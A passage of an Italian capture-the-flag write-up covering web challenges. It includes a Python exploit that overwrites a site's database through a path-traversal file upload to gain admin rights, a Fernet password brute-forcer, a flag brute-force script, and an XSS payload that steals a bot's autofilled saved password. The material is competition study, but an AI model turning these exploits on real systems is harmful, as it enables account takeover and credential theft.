</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="sa">f</span><span class="s2">&#34;Error: </span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="mi">404</span>
</span></span></code></pre></div><p>Questo endpoint forniva in seguito <strong>lettura arbitraria</strong> dell‚Äôintero filesystem, permettendoci di recuperare la flag.</p>
<h4 id="soluzione-1">Soluzione<a hidden class="anchor" aria-hidden="true" href="#soluzione-1">#</a></h4>
<p>Una volta confermata la vulnerabilit√† di <strong>path traversal</strong>, il passo successivo √® stato <strong>sovrascrivere il file <code>retro.db</code></strong> caricando un file malevolo chiamato <code>../../retro.db</code> tramite il form di upload dell‚Äôimmagine profilo.</p>
<p>Dopo aver sovrascritto con successo il database, ho ottenuto <strong>privilegi admin</strong>, che mi hanno consentito di usare un‚Äôaltra vulnerabilit√† di path traversal nell‚Äôendpoint <em>debug file</em> per leggere file arbitrari.</p>
<p>Da l√¨ ho scaricato <code>flag.txt</code></p>
<pre tabindex="0"><code>gAAAAABpDfJWpJyLk4xz6hJCspj6XEpp0dCKgZUegC18TYQHfABujfRSTCa0zEei6qnDP6k8I-2V0by1aeJSEhKhhWI5EWppnQ==
</code></pre><p>e <code>populate.py</code>, che conteneva la logica di inizializzazione del database.</p>
<p>Dentro <code>populate.py</code> ho trovato dati di default degli utenti e post, incluso un utente <strong>Josh</strong>, che menzionava spesso la sua password nei post e nelle chat.</p>
<p>Analizzandoli, ho dedotto che la password di Josh veniva usata come chiave per cifrare la flag con <strong>Fernet</strong>. Usando questo indizio, ho forzato tutte le combinazioni possibili dei frammenti della sua password finch√© la flag non si √® decrittata correttamente.</p>
<h4 id="script">Script<a hidden class="anchor" aria-hidden="true" href="#script">#</a></h4>
<p>Sono stati usati diversi script per risolvere la challenge, ma i due pi√π importanti sono l‚Äô<strong>exploit per ottenere i privilegi admin</strong> e lo <strong>script di brute-force della password</strong>.</p>
<h5 id="exploit-per-privilegi-admin">Exploit per privilegi admin<a hidden class="anchor" aria-hidden="true" href="#exploit-per-privilegi-admin">#</a></h5>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sqlite3</span><span class="o">,</span> <span class="nn">tempfile</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">werkzeug.security</span> <span class="kn">import</span> <span class="n">generate_password_hash</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">URL</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="k">assert</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">URL</span><span class="si">}</span><span class="s2">/&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">init_db</span><span class="p">(</span><span class="n">filename</span><span class="o">=</span><span class="s2">&#34;retro.db&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">conn</span> <span class="o">=</span> <span class="n">sqlite3</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">c</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">c</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s1">&#39;&#39;&#39;CREATE TABLE users (
</span></span></span><span class="line"><span class="cl"><span class="s1">        id INTEGER PRIMARY KEY AUTOINCREMENT,
</span></span></span><span class="line"><span class="cl"><span class="s1">        username TEXT UNIQUE,
</span></span></span><span class="line"><span class="cl"><span class="s1">        password TEXT,
</span></span></span><span class="line"><span class="cl"><span class="s1">        bio TEXT,
</span></span></span><span class="line"><span class="cl"><span class="s1">        is_admin INTEGER DEFAULT 0,
</span></span></span><span class="line"><span class="cl"><span class="s1">        profile_pic TEXT DEFAULT &#39;default.png&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">    )&#39;&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">c</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s1">&#39;&#39;&#39;CREATE TABLE posts (
</span></span></span><span class="line"><span class="cl"><span class="s1">        id INTEGER PRIMARY KEY AUTOINCREMENT,
</span></span></span><span class="line"><span class="cl"><span class="s1">        user_id INTEGER,
</span></span></span><span class="line"><span class="cl"><span class="s1">        title TEXT,
</span></span></span><span class="line"><span class="cl"><span class="s1">        content TEXT,
</span></span></span><span class="line"><span class="cl"><span class="s1">        FOREIGN KEY (user_id) REFERENCES users(id)
</span></span></span><span class="line"><span class="cl"><span class="s1">    )&#39;&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">c</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s1">&#39;&#39;&#39;CREATE TABLE comments (
</span></span></span><span class="line"><span class="cl"><span class="s1">        id INTEGER PRIMARY KEY AUTOINCREMENT,
</span></span></span><span class="line"><span class="cl"><span class="s1">        post_id INTEGER,
</span></span></span><span class="line"><span class="cl"><span class="s1">        user_id INTEGER,
</span></span></span><span class="line"><span class="cl"><span class="s1">        content TEXT,
</span></span></span><span class="line"><span class="cl"><span class="s1">        FOREIGN KEY (post_id) REFERENCES posts(id),
</span></span></span><span class="line"><span class="cl"><span class="s1">        FOREIGN KEY (user_id) REFERENCES users(id)
</span></span></span><span class="line"><span class="cl"><span class="s1">    )&#39;&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">c</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s1">&#39;&#39;&#39;CREATE TABLE chats (
</span></span></span><span class="line"><span class="cl"><span class="s1">        id INTEGER PRIMARY KEY AUTOINCREMENT,
</span></span></span><span class="line"><span class="cl"><span class="s1">        user1_id INTEGER,
</span></span></span><span class="line"><span class="cl"><span class="s1">        user2_id INTEGER,
</span></span></span><span class="line"><span class="cl"><span class="s1">        FOREIGN KEY (user1_id) REFERENCES users(id),
</span></span></span><span class="line"><span class="cl"><span class="s1">        FOREIGN KEY (user2_id) REFERENCES users(id)
</span></span></span><span class="line"><span class="cl"><span class="s1">    )&#39;&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">c</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s1">&#39;&#39;&#39;CREATE TABLE messages (
</span></span></span><span class="line"><span class="cl"><span class="s1">        id INTEGER PRIMARY KEY AUTOINCREMENT,
</span></span></span><span class="line"><span class="cl"><span class="s1">        chat_id INTEGER,
</span></span></span><span class="line"><span class="cl"><span class="s1">        sender_id INTEGER,
</span></span></span><span class="line"><span class="cl"><span class="s1">        content TEXT,
</span></span></span><span class="line"><span class="cl"><span class="s1">        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
</span></span></span><span class="line"><span class="cl"><span class="s1">        FOREIGN KEY (chat_id) REFERENCES chats(id),
</span></span></span><span class="line"><span class="cl"><span class="s1">        FOREIGN KEY (sender_id) REFERENCES users(id)
</span></span></span><span class="line"><span class="cl"><span class="s1">    )&#39;&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">c</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&#34;INSERT INTO users (username, password, bio, is_admin) VALUES (?, ?, ?, 1)&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">              <span class="p">(</span><span class="s2">&#34;admin&#34;</span><span class="p">,</span> <span class="n">generate_password_hash</span><span class="p">(</span><span class="s2">&#34;admin123&#34;</span><span class="p">),</span> <span class="s2">&#34;Retro overlord&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">conn</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">URL</span><span class="si">}</span><span class="s2">/register&#34;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="p">(</span><span class="n">username</span> <span class="o">:=</span> <span class="n">os</span><span class="o">.</span><span class="n">urandom</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span><span class="o">.</span><span class="n">hex</span><span class="p">()),</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="p">(</span><span class="n">password</span> <span class="o">:=</span> <span class="n">os</span><span class="o">.</span><span class="n">urandom</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span><span class="o">.</span><span class="n">hex</span><span class="p">()),</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;bio&#34;</span><span class="p">:</span> <span class="s2">&#34;hello&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">URL</span><span class="si">}</span><span class="s2">/login&#34;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="n">password</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="n">tempfile</span><span class="o">.</span><span class="n">NamedTemporaryFile</span><span class="p">(</span><span class="s2">&#34;w+b&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">tf</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">tf</span><span class="o">.</span><span class="n">name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">init_db</span><span class="p">(</span><span class="n">tf</span><span class="o">.</span><span class="n">name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">URL</span><span class="si">}</span><span class="s2">/edit_profile&#34;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;bio&#34;</span><span class="p">:</span> <span class="s2">&#34;palle&#34;</span><span class="p">,</span>   
</span></span><span class="line"><span class="cl">    <span class="p">},</span> <span class="n">files</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;profile_pic&#34;</span><span class="p">:</span> <span class="p">(</span><span class="s2">&#34;../../retro.db&#34;</span><span class="p">,</span> <span class="n">tf</span><span class="p">,</span> <span class="s2">&#34;image/jpeg&#34;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Uploaded malicious profile picture&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">URL</span><span class="si">}</span><span class="s2">/logout&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">URL</span><span class="si">}</span><span class="s2">/login&#34;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="s2">&#34;admin&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="s2">&#34;admin123&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get_dict</span><span class="p">())</span>
</span></span></code></pre></div><h5 id="script-di-brute-force-della-password">Script di brute-force della password<a hidden class="anchor" aria-hidden="true" href="#script-di-brute-force-della-password">#</a></h5>
<blockquote>
<p>N.B.: Le liste <code>d</code> e <code>n</code> contenevano parole e date trovate nelle chat di Josh, che suggerivano la struttura della password.</p>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span><span class="o">,</span> <span class="nn">itertools</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">cryptography.fernet</span> <span class="kn">import</span> <span class="n">Fernet</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives</span> <span class="kn">import</span> <span class="n">hashes</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives.kdf.pbkdf2</span> <span class="kn">import</span> <span class="n">PBKDF2HMAC</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">d</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;20.05.2023&#39;</span><span class="p">,</span> <span class="s1">&#39;14.03.2001&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">n</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;pixel&#39;</span><span class="p">,</span> <span class="s1">&#39;wigglepuff&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="n">n</span> <span class="o">+</span> <span class="n">d</span>
</span></span><span class="line"><span class="cl"><span class="n">l</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">itertools</span><span class="o">.</span><span class="n">permutations</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">perm</span> <span class="ow">in</span> <span class="n">l</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">password</span> <span class="o">=</span> <span class="s2">&#34;.&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">perm</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">salt</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;whatever&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">kdf</span> <span class="o">=</span> <span class="n">PBKDF2HMAC</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="n">algorithm</span><span class="o">=</span><span class="n">hashes</span><span class="o">.</span><span class="n">SHA256</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">        <span class="n">length</span><span class="o">=</span><span class="mi">32</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">salt</span><span class="o">=</span><span class="n">salt</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">iterations</span><span class="o">=</span><span class="mi">390000</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">urlsafe_b64encode</span><span class="p">(</span><span class="n">kdf</span><span class="o">.</span><span class="n">derive</span><span class="p">(</span><span class="n">password</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span> <span class="o">=</span> <span class="n">Fernet</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;flag.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">fh</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">token</span> <span class="o">=</span> <span class="n">fh</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">plaintext</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Password trovata: </span><span class="si">{</span><span class="n">password</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">plaintext</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">continue</span>
</span></span></code></pre></div><p>Questa combinazione di exploit e analisi ha portato alla decrittazione della flag e al completamento della challenge.</p>
<h3 id="not-wordle">Not wordle<a hidden class="anchor" aria-hidden="true" href="#not-wordle">#</a></h3>
<h4 id="analisi-2">Analisi<a hidden class="anchor" aria-hidden="true" href="#analisi-2">#</a></h4>
<p>Questa challenge era una piattaforma tipo Wordle in Node.js dove si potevano indovinare parole casuali (tutte esattamente di 5 caratteri).</p>
<p>Tuttavia, la challenge forniva un interruttore per parole &ldquo;random&rdquo;/&ldquo;daily&rdquo;. Quest‚Äôultimo usava un codice speciale <code>wotd</code>. Dopo aver analizzato per un po‚Äô il backend ho trovato questo snippet che implementava la logica di generazione della parola.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">getSecret</span><span class="p">(</span><span class="nx">mode</span><span class="p">,</span> <span class="nx">cookies</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">m</span> <span class="o">=</span> <span class="p">(</span><span class="nx">mode</span> <span class="o">||</span> <span class="nx">cookies</span><span class="p">.</span><span class="nx">mode</span> <span class="o">||</span> <span class="s1">&#39;random&#39;</span><span class="p">).</span><span class="nx">toLowerCase</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">m</span> <span class="o">===</span> <span class="s1">&#39;wotd&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">flag</span> <span class="o">=</span> <span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">FLAG</span> <span class="o">||</span> <span class="s1">&#39;REAL_FLAG_ON_REMOTE&#39;</span><span class="p">).</span><span class="nx">toLowerCase</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">{</span> <span class="nx">mode</span><span class="o">:</span> <span class="s1">&#39;wotd&#39;</span><span class="p">,</span> <span class="nx">secret</span><span class="o">:</span> <span class="nx">flag</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">secret</span> <span class="o">=</span> <span class="nx">cookies</span><span class="p">.</span><span class="nx">randomSecret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">secret</span> <span class="o">||</span> <span class="o">!</span><span class="sr">/^[a-z]{5}$/</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">secret</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">secret</span> <span class="o">=</span> <span class="nx">pickRandomWord</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{</span> <span class="nx">mode</span><span class="o">:</span> <span class="s1">&#39;random&#39;</span><span class="p">,</span> <span class="nx">secret</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>√à chiaro che la flag fosse la parola del giorno sulla piattaforma e che, in pratica, bastava trovarla.</p>
<h4 id="soluzione-2">Soluzione<a hidden class="anchor" aria-hidden="true" href="#soluzione-2">#</a></h4>
<p>Poich√© la challenge non memorizzava alcun contatore per il numero di tentativi, trovare la flag con un brute force era banale.</p>
<p>Inoltre, la challenge non controllava nemmeno la lunghezza del tentativo, quindi si poteva anche forzare la parola <strong>carattere per carattere</strong> usando l‚Äôalfabeto <code>0123456789abcdefCTF{}</code>.</p>
<h4 id="script-1">Script<a hidden class="anchor" aria-hidden="true" href="#script-1">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span><span class="o">,</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">URL</span> <span class="o">=</span> <span class="s2">&#34;http://a733fa9b.ctf.ac.upt.ro&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">LENGTH</span> <span class="o">=</span> <span class="mi">69</span>
</span></span><span class="line"><span class="cl"><span class="n">CHARSET</span> <span class="o">=</span> <span class="s1">&#39;CTF</span><span class="si">{}</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">hexdigits</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="s2">&#34;/api/start?mode=wotd&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">LENGTH</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">CHARSET</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="s2">&#34;/api/check&#34;</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;guess&#34;</span><span class="p">:</span> <span class="n">flag</span> <span class="o">+</span> <span class="n">c</span><span class="p">})</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">r</span><span class="p">[</span><span class="s1">&#39;feedback&#39;</span><span class="p">][</span><span class="n">i</span><span class="p">][</span><span class="s2">&#34;status&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;correct&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">flag</span> <span class="o">+=</span> <span class="n">c</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;FLAG:&#34;</span><span class="p">,</span> <span class="n">flag</span><span class="p">)</span>
</span></span></code></pre></div><h3 id="lolchat2">lolchat2<a hidden class="anchor" aria-hidden="true" href="#lolchat2">#</a></h3>
<h4 id="analisi-3">Analisi<a hidden class="anchor" aria-hidden="true" href="#analisi-3">#</a></h4>
<p>Questa challenge era un sequel dell‚Äôoriginale <code>lolchat</code>, che non avevamo risolto durante le qualificazioni.
Forniva una chat basata su stanze sviluppata con WebSocket in un ambiente <strong>black-box</strong>, senza accesso al codice backend, quindi sono state necessarie diverse assunzioni.</p>
<p>Come nell‚Äôoriginale, le prime tre stanze non rispondevano ai nostri messaggi. Tuttavia, nelle stanze <code>party</code> e <code>game</code> c‚Äôerano utenti che scambiavano messaggi casuali.</p>
<p>La pi√π interessante era <code>game</code>, dove l‚Äôutente <code>tom</code> inviava ripetutamente gli stessi messaggi, chiedendo aiuto per trovare la sua <strong>password</strong> (la flag). I messaggi pi√π significativi includevano:</p>
<ul>
<li>&ldquo;i think i had a password saved in my browser&rdquo;</li>
<li>&ldquo;it would usually fill it out for me&rdquo;</li>
</ul>
<p><img alt="screenshot della stanza di gioco della challenge" loading="lazy" src="/images/lolchat2.png"></p>
<h4 id="soluzione-3">Soluzione<a hidden class="anchor" aria-hidden="true" href="#soluzione-3">#</a></h4>
<p>Dopo alcune rapide osservazioni, √® risultato chiaro che la piattaforma era fortemente vulnerabile a <strong>XSS (Cross-Site Scripting)</strong>; l‚Äôunica validazione reale era <strong>lato client</strong>, applicata solo quando <em>si inviavano</em> messaggi, non quando <em>si ricevevano</em>.</p>
<p>Inizialmente abbiamo provato a reindirizzare il bot al nostro webhook, ma non ha funzionato: probabilmente era limitato alla sua rete localhost. Abbiamo quindi ipotizzato che l‚Äôapproccio migliore fosse far <strong>inviare</strong> al bot un messaggio nella chat contenente dati sensibili usando il nostro script iniettato, e questa volta ha <strong>funzionato</strong>.</p>
<p>Infine, abbiamo capito che potevamo far <strong>autocompilare</strong> al browser del bot un campo password (usando le credenziali salvate) e <strong>inviare</strong> il valore direttamente in chat, visibile a tutti.</p>
<h4 id="script-2">Script<a hidden class="anchor" aria-hidden="true" href="#script-2">#</a></h4>
<p>Di seguito l‚ÄôHTML che abbiamo usato per risolvere la challenge. Si basa sull‚Äôassunzione che il browser del bot compili automaticamente l‚Äôinput password, attivando l‚Äôevento <code>oninput</code>, che poi invia il messaggio nella stanza <code>game</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">form</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;password&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;password&#34;</span> <span class="na">autocomplete</span> <span class="na">oninput</span><span class="o">=</span><span class="s">&#34;window.socket.emit(&#39;sendMessage&#39;, { room: &#39;game&#39;, message: document.getElementsByName(&#39;password&#39;)[0].value });&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</span></span></code></pre></div><h2 id="exploitation-binaria-">Exploitation binaria üè¥‚Äç‚ò†Ô∏è<a hidden class="anchor" aria-hidden="true" href="#exploitation-binaria-">#</a></h2>
<h3 id="baby-ikea">baby-ikea<a hidden class="anchor" aria-hidden="true" href="#baby-ikea">#</a></h3>
<h4 id="analisi-4">Analisi<a hidden class="anchor" aria-hidden="true" href="#analisi-4">#</a></h4>
<p>La challenge permetteva di connettersi via netcat al server e inviare dei dati.
Dagli errori restituiti dal servizio, era chiaro che si potessero inviare solo dati codificati in base64.</p>
<p>Ho provato alcune istruzioni assembly a caso e ho scoperto che l‚Äôarchitettura era a 32 bit e che eseguiva codice asm arbitrario.</p>
<h4 id="soluzione-4">Soluzione<a hidden class="anchor" aria-hidden="true" href="#soluzione-4">#</a></h4>
